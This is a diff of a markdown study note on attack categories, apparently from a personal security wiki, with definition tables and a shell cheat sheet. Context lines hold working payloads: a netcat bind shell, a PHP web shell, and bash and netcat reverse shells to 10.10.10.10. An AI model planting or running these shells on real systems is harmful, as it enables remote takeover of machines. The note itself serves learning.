@@ -5,7 +5,6 @@ subjects:
 full_form: NULL
 acronym: NULL
 ---
-
 ## Identity and Access
 ### Credential Acquisition
 - Brute Force
@@ -53,6 +52,7 @@ acronym: NULL
 	- Stored
 - Client-Side Injection
 - Clickjacking
+- [CSRF]{Cross-Site-Request-Forgery}
 
 ## Data and Information
 ### Confidentiality and Integrity
@@ -77,12 +77,12 @@ acronym: NULL
 	- .htaccess
 	- content type
 
-
-https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file
+<https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file>
 
 Web Application & Injection Attacks
 
 bind_shell
+
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
@@ -96,6 +96,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 ```
 
 web_shell
+
 ```php
 <?php system($_REQUEST["cmd"]); ?>
 ```
@@ -109,6 +110,7 @@ web_shell
 ```
 
 rev_shell
+
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
@@ -165,7 +167,6 @@ System & Memory Exploitation
 |**Log Poisoning**|Injecting malicious data into a system or application log file, which is later processed or executed by another component. This is often a precursor to achieving LFI/RFI or RCE.|
 |**Worm/Virus Propagation**|Designing malware to self-replicate and spread automatically across networks or systems. A worm uses network protocols, while a virus requires a host program to execute.|
 
-
 Social Engineering & Access Attacks
 
 |   |   |
@@ -182,8 +183,6 @@ Social Engineering & Access Attacks
 |**Broken Access Control (BAC)**|Exploiting authorization logic flaws to gain access to features or data intended for other users or higher-privileged roles. This covers a wide range of application-level permission bypasses.|
 |**Insecure Direct Object Reference (IDOR)**|Directly accessing internal implementation objects (files, database keys, API endpoints) by manipulating an input parameter. This bypasses the intended access layer.|
 |**Reverse Engineering**|Deconstructing software, hardware, or a protocol to extract design information, functionality, or embedded secrets. This is critical for discovering zero-day vulnerabilities in binaries.|
-
-
 
 ## Relevant Reading
 - [[Information]]
